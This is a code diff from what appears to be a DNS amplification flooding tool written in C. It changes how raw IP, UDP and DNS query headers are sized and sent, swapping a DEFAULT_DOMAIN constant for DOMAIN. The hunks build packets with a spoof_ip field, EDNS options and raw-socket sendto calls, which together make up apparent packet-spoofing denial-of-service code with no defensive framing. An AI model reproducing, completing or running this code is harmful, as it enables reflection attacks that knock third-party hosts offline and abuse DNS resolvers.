@@ -137,7 +137,7 @@ Trash *Build_IP_Header(Trash *a)
     a->ip->frag_off = 0;
     a->ip->protocol = IPPROTO_UDP;
     a->ip->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(DNS_header) + 
-                              sizeof(DNS_query) + sizeof(DNS_opt) + strlen(DEFAULT_DOMAIN) + 1);
+                              sizeof(DNS_query) + sizeof(DNS_opt) + strlen(DOMAIN) + 1);
     a->ip->check = Checksum((unsigned short *) a->ip, sizeof(struct iphdr));
 
     return a;
@@ -151,7 +151,7 @@ Trash *Build_UDP_Header(Trash *a)
 
     a->udp->source = htons(rand());
     a->udp->dest = htons(spoof_ip);
-    a->udp->len = htons(sizeof(struct udphdr) + sizeof(DNS_header) + sizeof(DNS_opt) + sizeof(DNS_query) + strlen(DEFAULT_DOMAIN) + 1);
+    a->udp->len = htons(sizeof(struct udphdr) + sizeof(DNS_header) + sizeof(DNS_opt) + sizeof(DNS_query) + strlen(DOMAIN) + 1);
     a->udp->check = 0;
 
     return a;
@@ -204,8 +204,8 @@ Trash *DNS_Request(Trash *a)
 
     qname = &a->packet[sizeof(struct iphdr) + sizeof(struct udphdr) + 
         sizeof(DNS_header)];
-    /*job->domain = "www.google.com.";*/
-    DNS_Format(qname, DEFAULT_DOMAIN);
+    
+    DNS_Format(qname, DOMAIN);
 
     a->query = (DNS_query *) &a->packet[sizeof(struct iphdr) + 
         sizeof(struct udphdr) + sizeof(DNS_header) + (strlen(qname) + 1)];
@@ -259,7 +259,7 @@ void Implement(int a)
     b = Fillin_sock(b);
 
     sendto(b->sock, b->packet, sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(DNS_header)
-                             + sizeof(DNS_query) + sizeof(DNS_opt)+ strlen(DEFAULT_DOMAIN) + 1, 0, (struct sockaddr *) &b->target, sizeof(b->target));
+                             + sizeof(DNS_query) + sizeof(DNS_opt)+ strlen(DOMAIN) + 1, 0, (struct sockaddr *) &b->target, sizeof(b->target));
 
     close(b->sock);
     free(b->packet);
